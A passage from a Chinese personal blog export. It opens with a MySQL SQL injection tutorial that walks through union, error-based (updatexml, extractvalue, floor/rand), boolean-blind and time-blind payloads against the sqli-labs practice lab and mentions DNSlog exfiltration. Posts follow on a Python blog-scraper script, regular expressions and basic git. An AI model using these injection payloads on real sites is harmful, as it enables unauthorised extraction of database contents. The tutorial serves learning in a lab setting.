<p>user()                                返回当前用户信息</p>
<p>group_concat(name)         将name列以一行返回</p>
<p>Ascii()                                返回参数的ASCII值</p>
<p>length()                              返回长度</p>
<p>count()                               返回元组个数</p>
<p>if(a, b, c)                            条件语句，等价于 a?b:c</p>
<p>sleep()                               睡眠函数</p>
<p>substr()                         截取字符串长度</p>
<p>load_file()                          读文件操作，需要用户具有FILE权限，且读取文件小于max_allowed_packet字节</p>
<p>into outfile()                        写文件操作，需要用户具有FILE权限</p>
<ol start="3">
<li>MySQL中的注释符</li>
</ol>
<ul>
<li><code>#</code></li>
<li><code>--+</code></li>
<li><code>/*注释中间*/</code></li>
<li><code>;%00</code>(00截断原理，成功率不是很高)</li>
</ul>
</li>
</ol>
<h2 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h2><p>​        联合查询是使用MySQL中的UNION查询，其用于把来自多个SELECT语句的结果组合到一个结果集合中，且每列的数据类型必须相同，而且UNION连接的SELECT语句中列数也要相同。</p>
<h3 id="猜解列数"><a href="#猜解列数" class="headerlink" title="猜解列数"></a>猜解列数</h3><p>​        在使用UNION前首先得知道列数，才能构造正确的联合查询语句，可以使用ORDER BY字句：</p>
<p>​        我们用sqli举例：</p>
<p>​        此时我们用order by 3 ，让查询结果根据第三列排序</p>
<p><img src="https://s1.ax1x.com/2020/03/23/8HsvtA.png" alt="8HsvtA.png"></p>
<p>​        结果没问题，再次测试order by 4</p>
<p><img src="https://s1.ax1x.com/2020/03/23/8HyZhn.png" alt="8HyZhn.png"></p>
<p>​        此时就知道该结果有三列</p>
<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>​        当知道列数的时候，就可以写出payload查询数据的信息：</p>
<p>比如：</p>
<p>查询数据库版本和当前数据库名：<code>?id=&#39;union select 1,version(),database()--+</code></p>
<p><img src="https://s1.ax1x.com/2020/03/23/8H6CCR.png" alt="8H6CCR.png"></p>
<p>注意：页面的显示位只有两个，猜测为查询结果的第一个元组的第二三列属性，所以此时将前一个select语句查询结果置空，并且让第二个查询语句中第一列参数无意义。</p>
<p>这个时候其实这个注入点就有很多利用方式了，主要在于payload编写的目的用途：</p>
<p>查看所有库名字和当前库的所有表名：<code>?id=&#39;union select 1,2,group_concat(TABLE_NAME) from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA=database()--+</code></p>
<p><img src="https://s1.ax1x.com/2020/03/23/8Hg8Ag.png" alt="8Hg8Ag.png"></p>
<p>此处用group_concat()是为了让结果按行输出，才能正确输出到显示位上。</p>
<p>其他的payload类似，可以通过先获取全部的数据库名，在获取全部表名，再把所有列名获取，这样就可以获取DBMS中全部的数据了。</p>
<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>​        攻击者使用各种手段使程序报错，爆出相应的数据信息。前提是开发者讲sql语句的错误显示到页面上(具体的话或许开发人员开发时显示错误信息进行调试，结果忘记删除语句或者留者下次使用)。</p>
<p>​        一般是在页面没有显示位、但用<code>echo mysql_error();</code>输出了错误信息的时候使用，它的特点是注入速度快，但是语句较复杂。</p>
<h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><p>​        concat(str1, str2)    将字符串首尾相连</p>
<p>​        updatexml((XML_document, XPath_string, new_value) 第一个参数：xml文档的名称，第二个参数：xpath格式的字符串，第三个参数：替换查找到的符合条件的数据</p>
<p>​        extractvalue(xml_str , Xpath)  第一个参数意思是传入xml文档，第二个参数xpath意思是传入文档的路径</p>
<h3 id="利用xmlpath报错"><a href="#利用xmlpath报错" class="headerlink" title="利用xmlpath报错"></a>利用xmlpath报错</h3><p>​        在XPath处加上特殊字符，并加上查询语句，MySQL就会将错误和查询语句结果报错显示出来</p>
<p>注意：</p>
<ol>
<li>必须在XPath传入特殊字符，MySQL才会报错</li>
<li>XPath只会对特殊字符进行报错，这里可以用~，16进制的0x7e来进行利用</li>
<li>XPath只会报错32个字符，所以要用到substr</li>
</ol>
<h4 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h4><p>还是以sqli-less1举例，这里输出了mysql_error()，注意的是这里的注入点id是一个字符型注入，需要加<code>&#39;</code>进行闭合</p>
<p><code>?id=1&#39;and updatexml(1,concat(0x7e,version(),0x7e),1)--+</code></p>
<p><img src="https://s1.ax1x.com/2020/03/25/8Os2kD.png" alt="8Os2kD.png"></p>
<p>可以发现这里将MySQL的版本信息显示了出来</p>
<p><code>?id=1&#39;and updatexml(1,concat(0x7e,(select substr(group_concat(table_name),1,32) from information_schema.tables where table_schema=database()),0x7e),1)--+</code></p>
<p><img src="https://s1.ax1x.com/2020/03/25/8OyE9J.png" alt="8OyE9J.png"></p>
<p>这里使用<code>substr</code>函数是为了在XPath报错长度限制下进行分段输出，但是此时<code>group_concat(table_name)</code>的长度小于32，也可以不加<code>substr</code></p>
<p>除了updatexml函数，也可以使用extractvalue函数</p>
<p><code>1&#39;and extractvalue(1,concat(0x7e,version()))--+</code></p>
<p><img src="https://s1.ax1x.com/2020/03/25/8O6HJg.png" alt="8O6HJg.png"></p>
<p>extractvalue函数原理和updatexml函数类似，payload也相同，按照格式也可以写出其他payload将数据库所有信息查询出来。</p>
<h3 id="基于主键重复的报错注入"><a href="#基于主键重复的报错注入" class="headerlink" title="基于主键重复的报错注入"></a>基于主键重复的报错注入</h3><p><a href="https://blog.csdn.net/he_and/article/details/80455884" target="_blank" rel="noopener">参考文章</a>(这篇博客非常棒，通俗易懂的介绍了这种报错注入原理)</p>
<h4 id="相关函数-1"><a href="#相关函数-1" class="headerlink" title="相关函数"></a>相关函数</h4><ol>
<li>floor()            向下取整</li>
<li>rand()            0到1之间取随机数</li>
<li>rand(0)           0到1之间取随机数，伪随机机制，有规律(0110 0110)</li>
</ol>
<h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><ol>
<li><p>group by 语句后跟的为主键，其值具有唯一性，当不唯一重复时会报错。</p>
</li>
<li><p>group by语句后面的字段会被运算两次。</p>
<p><strong>第一次：</strong>group by后面的字段值拿到虚拟表中去对比，对比之前要运算group by后面字段的值，所以第一次的运算就发生在这里。</p>
<p><strong>第二次：</strong>现在假设下一次扫描的字段的值没有在虚拟表中出现，也就是group by后面的字段的值在虚拟表中还不存在，那么就需要把它插入到虚拟表中，这里在插入时会进行第二次运算，由于rand函数存在一定的随机性，所以第二次运算的结果可能与第一次运算的结果不一致，但是这个运算的结果可能在虚拟表中已经存在了，那么这时的插入必然导致错误！</p>
</li>
<li><p>例如payload：<code>select count(*),(concat(floor(rand(0)*2),&#39;@&#39;,(select version())))x from users group by x</code></p>
<p><code>group by</code>会根据<code>x</code>也就是<code>concat(floor(rand(0)*2),(select version()))</code>取遍历基本表的行数，查询虚拟表，假设当前<code>version()</code>为5.7.26，第一次遍历计算得到<code>0@5.7.26</code>，虚拟表没有，则插入，但此时经过二次计算又得到<code>1@5.7.26</code>，在虚拟表中记录<code>1    1@5.7.26</code>，前面的1是count的值。group by再次遍历计算得到<code>1@5.7.26</code>，表中具有这个主键值，所以直接修改count值即可，不再计算，所以虚拟表就变为<code>2    1@5.7.26</code>，第三次group by遍历计算得到<code>0@5.7.26</code>，虚拟表中没有这个，需要新的元组插入，插入时经历第二次计算，得到<code>1@5.7.26</code>，但是<code>1@5.7.26</code>再虚拟表中已经有了，而且<code>x</code>是主码，此时就会报错，并且将<code>1@5.7.26</code>显示到前端显示位上</p>
</li>
</ol>
<h4 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h4><p>还是以sqli-less1举例，因为这里输出了mysql_error()</p>
<p><code>?id=1&#39;union select 1,count(*),(concat(floor(rand(0)*2),&#39;@&#39;,(select version())))x from information_schema.columns group by x --+</code></p>
<p>注意的是这里后面联合查询用的表是<code>information_schema.columns</code>，因为这个表是一定存在的(MySQL版本大于5.0)，当然你也可以使用例如：<code>information_schema.tables</code>，<code>information_schema.schemata</code></p>
<p><img src="https://s1.ax1x.com/2020/03/26/GSQj0J.png" alt="GSQj0J.png"></p>
<p>来点长的复杂的payload：</p>
<p><code>?id=1&#39;union select 1,count(*),(concat(floor(rand(0)*2),&#39;@&#39;,(select group_concat(TABLE_NAME) from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA=database())))x from information_schema.columns group by x --+</code></p>
<p>可以看到此处将当前使用的数据库里所有表名全部爆了出来</p>
<p><img src="https://s1.ax1x.com/2020/03/26/GSlO8P.png" alt="GSlO8P.png"></p>
<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>​        在实际应用中，如果页面没有显示位，输出SQL执行的错误信息，但如果存在这样一种情况，即如果执行了正确的SQL语句，则返回一个页面，如果SQL语句执行错误，则执行另一种页面。基于两种页面，来判断SQL语句的正确与否，达到获取数据的目的。</p>
<p>​        布尔盲注有一个缺点，就是速度太慢，消耗大量时间。</p>
<h3 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h3><p>布尔盲注的相关函数上面有提及，下面使用sqli-less8举例，这个就是用到布尔盲注进行爆破。</p>
<p>在sqli-less8中只有两种页面，没有显示位：</p>
<p>成功时页面为：</p>
<p><img src="https://s1.ax1x.com/2020/03/26/G9wsV1.png" alt="G9wsV1.png"></p>
<p>失败时页面为：</p>
<p><img src="https://s1.ax1x.com/2020/03/26/G9w656.png" alt="G9w656.png"></p>
<p>我们先获取数据库名的长度：</p>
<p><code>and (select length(database()))=长度</code></p>
<p><img src="https://s1.ax1x.com/2020/03/27/G9sy90.png" alt="G9sy90.png"></p>
<p>可以看到数据库名字长度为8位，然后我们可以逐一爆破出数据库的名字：</p>
<p><code>and (select ascii(substr(database(),位数,1)))=ascii码</code></p>
<p>猜解表的数量</p>
<p><code>and (select count(table_name) from information_schema.tables where table_schema=database())=数量</code></p>
<p>猜解某个表长度</p>
<p><code>and (select length(table_name) from information_schema.tables where table_schema=database() limit 某行,1)=长度</code></p>
<p>逐位猜解表名</p>
<p><code>and (select ascii(substr(table_name,1,1)) from information_schema.tables where table_schema = database() limit n,1)=ascii码</code></p>
<p>依次类推，知道可以猜解出全部的数据，整个猜解逻辑为：</p>
<ol>
<li>猜解数据库名字长度，然后猜解到数据库名字</li>
<li>猜解数据库表的数量，然后猜解每个表的名字长度，最后把每个表的名字猜解出来</li>
<li>猜解猜解列名数量，然后猜解某个列名长度，最后逐位猜解列名</li>
<li>判断数据的数量，然后猜解某条数据的长度，最后逐位猜解数据</li>
</ol>
<p>注意：猜解时候可以用到大于小于号，然后利用二分法加快查找，也可以使用Burp Suite暴力破解</p>
<h2 id="延时盲注"><a href="#延时盲注" class="headerlink" title="延时盲注"></a>延时盲注</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>​        通过SQL语句查询的时间来进行注入，一般用于无页面回显，无报错，即只有一种页面的情况。</p>
<h3 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h3><p>​        关于延时盲注的相关函数上面也有介绍</p>
<p>​        实际中我们可以构造这样的payload：<code>if(1=1,sleep(5),1)</code>，当<code>1=1</code>为真时，页面将延时5秒回显，在这个判断语句中可以同布尔盲注一样加入蕴含数据库信息的语句。</p>
<p>​        下面进行用sqli-less9举例，sqli-less9就是一个具有延时盲注的注入点。</p>
<p><img src="https://s1.ax1x.com/2020/03/27/GPs2DS.png" alt="GPs2DS.png"></p>
<p>我们先获取数据库名的长度：</p>
<p><code>and if((select length(database()))=长度,sleep(5),0)</code></p>
<p><img src="https://s1.ax1x.com/2020/03/27/GPy2xx.png" alt="GPy2xx.png"></p>
<p>可以看到数据库名字长度为8位，当然可以通过<code>&gt;``&lt;</code>确定一个范围在进行搜索</p>
<p>其他的payload也可以依次类推出来，构造的查询语句和布尔盲注类似</p>
<p>猜解数据库名</p>
<p><code>and if((select ascii(substr(database(),位数,1))=ascii码),sleep(5),0)</code></p>
<p>判断表名的数量</p>
<p><code>and if((select count(table_name) from information_schema.tables where table_schema=database())=个数,sleep(5),0)</code></p>
<p>判断某个表名的长度</p>
<p><code>and if((select length(table_name) from information_schema.tables where table_schema=database() limit n,1)=长度,sleep(5),0)</code></p>
<p>等等，猜测的逻辑和布尔盲注相同。</p>
<h2 id="DNSlog注入"><a href="#DNSlog注入" class="headerlink" title="DNSlog注入"></a>DNSlog注入</h2><p>​        DNSlog注入，作用于Windows上服务器的SQL注入方式，MySQL像三级域名解析，像DNS服务器发送DNS请求，被记录在日志中，其中三级域名中含有数据库信息，查看日志即可获取信息。</p>
<p>原理过程如下：</p>
<p><img src="https://p4.ssl.qhimg.com/t01a278167ad3a008db.jpg" alt="dnslog.jpg"></p>
<p>（注意：LOAD_FILE函数使用是有条件的）</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>小工具-我的博客查看脚本</title>
    <url>/2020/03/18/%E5%B0%8F%E5%B7%A5%E5%85%B7-%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2%E6%9F%A5%E7%9C%8B%E8%84%9A%E6%9C%AC/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​        这段时间在学习正则，学完总想拿来实践一下，转头想了想，干起了老本行——爬虫，虽然之前写爬虫的时候也用到了正则，但是都是知其然不知其所以然，也好久没有过python写代码了，随便写了写脚本，之后也会写一些渗透用的脚本(poc或者exp)，这些都会放到杂项分类里面。</p>
<a id="more"></a>

<h1 id="程序目标"><a href="#程序目标" class="headerlink" title="程序目标"></a>程序目标</h1><p>​        思来想去，也没啥想爬取的内容，想起每次用hexo把博客推到远端，得要打开客户端看一下推成功了没，就像爬取一下自己博客的信息，只要用来练练手，就是没事做，闲得慌。</p>
<p>​        程序代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> optparse</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">url = <span class="string">"https://bmoos.github.io"</span></span><br><span class="line">agent = &#123;<span class="string">'User-Agent'</span> : <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36'</span>&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">()</span>:</span></span><br><span class="line">    r = requests.get(url,headers = agent)</span><br><span class="line">    <span class="comment">#编写正则表达式</span></span><br><span class="line">    pattern_url_name = re.compile(<span class="string">r'&lt;a href="(.*?)" class="post-title-link" itemprop="url"&gt;(.*?)&lt;/a&gt;'</span>)</span><br><span class="line">    pattern_lasttime = re.compile(<span class="string">r'&lt;time title="创建时间：(.*?)"'</span>)</span><br><span class="line">    pattern_word = re.compile(<span class="string">r'&lt;span&gt;([\d.\w]*)&lt;/span&gt;'</span>)</span><br><span class="line">    pattern_page = re.compile(<span class="string">r'&lt;a class="page-number" href="(.*?)"&gt;'</span>)</span><br><span class="line">    <span class="comment">#读取首页的信息</span></span><br><span class="line">    passage = re.findall(pattern_url_name,r.text)</span><br><span class="line">    lasttime = re.findall(pattern_lasttime,r.text)</span><br><span class="line">    word = re.findall(pattern_word,r.text)</span><br><span class="line">    page = re.findall(pattern_page,r.text)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> page: <span class="comment">#读取其他页的信息</span></span><br><span class="line">        url_page = url + i</span><br><span class="line">        req = requests.get(url_page,headers = agent)</span><br><span class="line">        passage += re.findall(pattern_url_name,req.text)</span><br><span class="line">        lasttime += re.findall(pattern_lasttime,req.text)</span><br><span class="line">        word += re.findall(pattern_word,req.text)</span><br><span class="line">    all_information = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(passage)):</span><br><span class="line">        passage_information = []</span><br><span class="line">        passage_information.append(passage[i][<span class="number">0</span>])</span><br><span class="line">        passage_information.append(passage[i][<span class="number">1</span>])</span><br><span class="line">        passage_information.append(lasttime[i])</span><br><span class="line">        passage_information.append(word[i])</span><br><span class="line">        all_information.append(passage_information)</span><br><span class="line">    <span class="keyword">return</span> all_information</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_list</span><span class="params">()</span>:</span></span><br><span class="line">    table = init()</span><br><span class="line">    print(<span class="string">'--------------------------------------------------'</span>)</span><br><span class="line">    print(<span class="string">'passage_name/create_time/word_number'</span>)</span><br><span class="line">    print(<span class="string">'--------------------------------------------------'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(table)):</span><br><span class="line">        print(table[i][<span class="number">1</span>]+<span class="string">'/'</span>+table[i][<span class="number">2</span>]+<span class="string">'/'</span>+table[i][<span class="number">3</span>])</span><br><span class="line">        print(<span class="string">'--------------------------------------------------'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_passage</span><span class="params">(name)</span>:</span></span><br><span class="line">    table = init()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(table)):</span><br><span class="line">        <span class="keyword">if</span> name == table[i][<span class="number">1</span>]:</span><br><span class="line">            urls = url + urllib.parse.unquote(table[i][<span class="number">0</span>])<span class="comment">#对url编码解码</span></span><br><span class="line">            print(<span class="string">'文章地址：'</span>+urls)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    print(<span class="string">'文章名出错'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    parser = optparse.OptionParser(<span class="string">"%prog "</span> + <span class="string">"-l or -p &lt;passage&gt;"</span>)</span><br><span class="line">    parser.add_option(<span class="string">'-l'</span>, action = <span class="string">'store_true'</span>, dest = <span class="string">'list'</span>, help = <span class="string">'all passage information'</span>)</span><br><span class="line">    parser.add_option(<span class="string">'-p'</span>, dest = <span class="string">'passage_name'</span>, type = <span class="string">'string'</span>, help = <span class="string">'passage content'</span>)</span><br><span class="line">    (options, args) = parser.parse_args()</span><br><span class="line">    <span class="keyword">if</span> options.list <span class="keyword">and</span> options.passage_name == <span class="literal">None</span>:</span><br><span class="line">        print_list()</span><br><span class="line">    <span class="keyword">if</span> options.passage_name <span class="keyword">and</span> options.list == <span class="literal">None</span>:</span><br><span class="line">        print_passage(options.passage_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>用法：在命令行使用，有两个参数，一个是<code>-l</code>用来查看所有的博客文章：</p>
<p><img src="https://s1.ax1x.com/2020/03/18/8DKTat.png" alt="8DKTat.png"></p>
<p>一个是<code>-p</code>后跟博客文章名，可以返回博客文章链接(PS：本来是想返回博客内容的，但是看到博客内容不是连续的文本，有很多标签分割，正则不可能，而且博客也有图片，最后实现和自己想的差很多，就只能返回博客文章地址，之后更新的时候或许会加入其他功能，之后在想)</p>
<p><img src="https://s1.ax1x.com/2020/03/18/8DlJUI.png" alt="8DlJUI.png"></p>
]]></content>
      <categories>
        <category>杂项</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>正则表达式</title>
    <url>/2020/03/17/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​        正则表达式(Regular Expression)是一种<strong>文本模式</strong>，包括普通字符（例如，a 到 z 之间的字母）和特殊字符（称为”元字符”）。</p>
<p>​        正则表达式使用单个字符串来描述、匹配一系列匹配某个<strong>句法规则</strong>的字符串。</p>
<p>​        学习正则可以提高效率，而且现在大多语言都支持正则，之前因为觉得正则太复杂而放弃，现在有了大把时间可以重新学习一下。。。</p>
<p>​        注意：本文只是对正则入门级操作，复杂多样的正则不涉及(PS：太难了QAQ)。</p>
<a id="more"></a>

<h2 id="正则的普通用法"><a href="#正则的普通用法" class="headerlink" title="正则的普通用法"></a>正则的普通用法</h2><p>​        正则表达式描述了一种字符串匹配的模式（pattern），可以用来检查一个串是否含有某种子串、将匹配的子串替换或者从某个串中取出符合某个条件的子串等。</p>
<p>​        构造正则表达式的方法和创建数学表达式的方法一样。也就是用多种元字符与运算符可以将小的表达式结合在一起来创建更大的表达式。正则表达式的组件可以是单个的字符、字符集合、字符范围、字符间的选择或者所有这些组件的任意组合。</p>
<p>​        正则表达式是由普通字符（例如字符 a 到 z）以及特殊字符（称为”元字符”）组成的文字模式。模式描述在搜索文本时要匹配的一个或多个字符串。正则表达式作为一个模板，将某个字符模式与所搜索的字符串进行匹配。</p>
<p>（以上引用<a href="https://www.runoob.com/regexp/regexp-tutorial.html" target="_blank" rel="noopener">菜鸟教程正则表达式</a>）</p>
<p>​        简单来说正则表达式就是就一个用一些既定的规则表示要查找的子串格式，逻辑上说和正常生活中查找字符串逻辑差不多（用一些字符串的特征去查找），这是我的理解，对我来说正则表达式复杂多样，我只要会使用简单的正则，会读懂复杂正则表达式就足够了。</p>
<p>​        正则表达式是由普通字符（例如字符 a 到 z）以及特殊字符（称为”元字符”）组成的文字模式。模式描述在搜索文本时要匹配的一个或多个字符串。正则表达式作为一个模板，将某个字符模式与所搜索的字符串进行匹配。</p>
<p><img src="https://s1.ax1x.com/2020/03/17/8aChuj.png" alt="8aChuj.png"></p>
<p>​        (注意：遇到特殊字符，比如：<code>( ) / . * + { } ? $ ^</code>等可以用’ \ ‘进行转义)        </p>
<p>​        根据上图其实已经掌握了基本的正则表达式，现在举个例子</p>
<blockquote>
<p>This is somthing<br>is about<br>a blah<br>words<br>sequence of words<br>Hello and<br>GoodBye and<br>Go gogo!</p>
</blockquote>
<p>​        在其中找到长度为5的单词  <code>/\b\w{5}\b/g</code></p>
<p><img src="https://s1.ax1x.com/2020/03/17/8aETa9.png" alt="8aETa9.png"></p>
<p>注意：<code>*</code> <code>+</code>限定符都是贪婪的，因为它们会尽可能多的匹配文字，只有在它们的后面加上一个<code>?</code>就可以实现非贪婪或最小匹配。</p>
<blockquote>
<p>例如：<code>&lt;html&gt;javascript&gt;</code></p>
<p>正则表达式 <code>/&lt;.*&gt;/</code>和<code>/&lt;.+&gt;/</code>会匹配到<code>&lt;html&gt;javascript&gt;</code></p>
<p>而如果想要匹配<code>&lt;html&gt;</code>，可以用到<code>/&lt;.*？&gt;/</code>或<code>/&lt;.+？&gt;/</code></p>
</blockquote>
<h2 id="正则分类符"><a href="#正则分类符" class="headerlink" title="正则分类符"></a>正则分类符</h2><p>之前所说的是普通字符，现在来考虑分类符</p>
<p>eg：要查找电话号码，已知有如下三种格式的电话号码</p>
<blockquote>
<p>134-3737-4399</p>
<p>134.3737.4399</p>
<p>(029)8288-4399</p>
</blockquote>
<p>当然我们可以分别用<code>/\d{3}-\d{4}-\d{4}/</code> <code>/\d{3}.\d{4}.\d{4}/``/\(\d{3}\)\d{4}-\d{4}/</code>三个正则表达式来查找</p>
<p>但是有没有通用的正则表达式呢</p>
<p>当然，可以使用<code>[]</code>分类符</p>
<blockquote>
<p>bmoos bmoo$ bmoo3</p>
<p>可以用<code>/bmoo[s$3]/</code>来查找</p>
</blockquote>
<p>那么<code>[]</code>的意思就是在该位置上的字符是<code>[]</code>里的任意一个字符，可以理解为”或”</p>
<p>那上述电话号码可以用到通用的正则表达式<code>/\(?\d{3}[-.)]\d{4}[-.]\d{4}/</code></p>
<p><img src="https://s1.ax1x.com/2020/03/17/8aDFfA.png" alt="8aDFfA.png"></p>
<p>刚才介绍了最简单和基本的功能，但是有些特殊的地方需要注意</p>
<ol>
<li>-连接符是第一个字符时</li>
</ol>
<p>比如<code>[-.]</code>的含义是连字符<code>-</code>或者点符<code>.</code>。 但是，如果当连字符不是第一个字符时，比如<code>[a-z]</code>，这就表示是从字母a到字符z。</p>
<ol>
<li><code>[]</code>中的<code>^</code></li>
</ol>
<p><code>^</code>在之前介绍中，是表示一行开头，但是在<code>[]</code>中，有着不同的含义。 <code>[ab]</code> 表示a或者b ，<code>[^ab]</code>表示啥都行，只要不是a或b，相当于取反</p>
<p>除了可以用<code>[]</code>表达或逻辑外，还可以用一种方式表达<code>(a|b)</code></p>
<p>eg：写一个邮箱的正则表达式：</p>
<blockquote>
<p><code>bilibili@126.com</code>  </p>
<p><code>protect@google.net</code> </p>
<p><code>hahaha.ha@xupt.edu</code></p>
<p><code>slibo921@gmail.com</code></p>
</blockquote>
<p>那么可以用正则表达式：<code>/[\w.]+@\w+\.(com|net|edu)/</code></p>
<p><img src="https://s1.ax1x.com/2020/03/17/8ac1sI.png" alt="8ac1sI.png"></p>
<h2 id="python中的正则"><a href="#python中的正则" class="headerlink" title="python中的正则"></a>python中的正则</h2><p>在python中正则主要使用re模块</p>
<p>re模块中有以下主要函数：</p>
<h3 id="re-match函数"><a href="#re-match函数" class="headerlink" title="re.match函数"></a>re.match函数</h3><p>re.match 尝试从字符串的起始位置匹配一个模式，如果不是起始位置匹配成功的话，match()就返回none。</p>
<p>函数语法：</p>
<p><code>re.match(pattern, string, flags)</code></p>
<h3 id="re-search方法"><a href="#re-search方法" class="headerlink" title="re.search方法"></a>re.search方法</h3><p>re.search 扫描整个字符串并返回第一个成功的匹配。</p>
<p>函数语法：</p>
<p><code>re.search(pattern, string, flags)</code></p>
<h3 id="检索和替换"><a href="#检索和替换" class="headerlink" title="检索和替换"></a>检索和替换</h3><p>Python 的re模块提供了re.sub用于替换字符串中的匹配项。</p>
<p>语法：</p>
<p><code>re.sub(pattern, repl, string, count=0, flags)</code></p>
<p>参数：</p>
<ul>
<li>pattern : 正则中的模式字符串。</li>
<li>repl : 替换的字符串，也可为一个函数。</li>
<li>string : 要被查找替换的原始字符串。</li>
<li>count : 模式匹配后替换的最大次数，默认 0 表示替换所有的匹配。</li>
<li>flags : 编译时用的匹配模式，数字形式。</li>
</ul>
<p>前三个为必选参数，后两个为可选参数。</p>
<h3 id="compile-函数"><a href="#compile-函数" class="headerlink" title="compile 函数"></a>compile 函数</h3><p>compile 函数用于编译正则表达式，生成一个正则表达式（ Pattern ）对象，供 match() 和 search() 这两个函数使用。</p>
<p>语法格式为：</p>
<p><code>re.compile(pattern[, flags])</code></p>
<h3 id="findall"><a href="#findall" class="headerlink" title="findall"></a>findall</h3><p>在字符串中找到正则表达式所匹配的所有子串，并返回一个列表，如果没有找到匹配的，则返回空列表。</p>
<p><strong>注意：</strong> match 和 search 是匹配一次 findall 匹配所有。</p>
<p>语法格式为：</p>
<p><code>re.findall(pattern, string, flags)</code></p>
<h3 id="re-finditer"><a href="#re-finditer" class="headerlink" title="re.finditer"></a>re.finditer</h3><p>和 findall 类似，在字符串中找到正则表达式所匹配的所有子串，并把它们作为一个迭代器返回。</p>
<p><code>re.finditer(pattern, string, flags)</code></p>
<h3 id="可选修饰符flags"><a href="#可选修饰符flags" class="headerlink" title="可选修饰符flags"></a>可选修饰符flags</h3><p><img src="https://s1.ax1x.com/2020/03/18/8dtpse.png" alt="8dtpse.png"></p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://juejin.im/post/5b5db5b8e51d4519155720d2#heading-6" target="_blank" rel="noopener">https://juejin.im/post/5b5db5b8e51d4519155720d2#heading-6</a></p>
<p><a href="https://www.runoob.com/regexp/regexp-tutorial.html" target="_blank" rel="noopener">https://www.runoob.com/regexp/regexp-tutorial.html</a></p>
<p><a href="https://www.runoob.com/python3/python3-reg-expressions.html" target="_blank" rel="noopener">https://www.runoob.com/python3/python3-reg-expressions.html</a></p>
]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title>git使用</title>
    <url>/2020/03/10/git%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h1 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​        git是一个开源的分布式版本控制系统，它能帮助你管理不同的版本，并且随时退回到任意时刻，而且也可以协同开发。之前也学过一点git，不过那阵用不到git，而且学的也比较琐碎难以理解，现在在我有一定基础的情况下，重新学习git，写下这份博客用以记录学习内容。Git指令繁多，但是常用的就十几条，下述介绍的指令掌握了足以应对常规使用，新的指令也会慢慢学习记录。</p>
<a id="more"></a>

<h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><h3 id="初始化一个仓库"><a href="#初始化一个仓库" class="headerlink" title="初始化一个仓库"></a>初始化一个仓库</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure>

<p>将当前目录变成Git可以管理的仓库，当前目录下多了一个<code>.git</code>的目录，这个目录是Git来跟踪管理版本库的。</p>
<h3 id="提交"><a href="#提交" class="headerlink" title="提交"></a>提交</h3><p>先将文件加入暂存区</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git add &lt;filename&gt;</span><br></pre></td></tr></table></figure>

<p>可以使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git add .</span><br></pre></td></tr></table></figure>

<p>将所有文件都加入暂存区</p>
<p>然后，把文件提交到仓库</p>
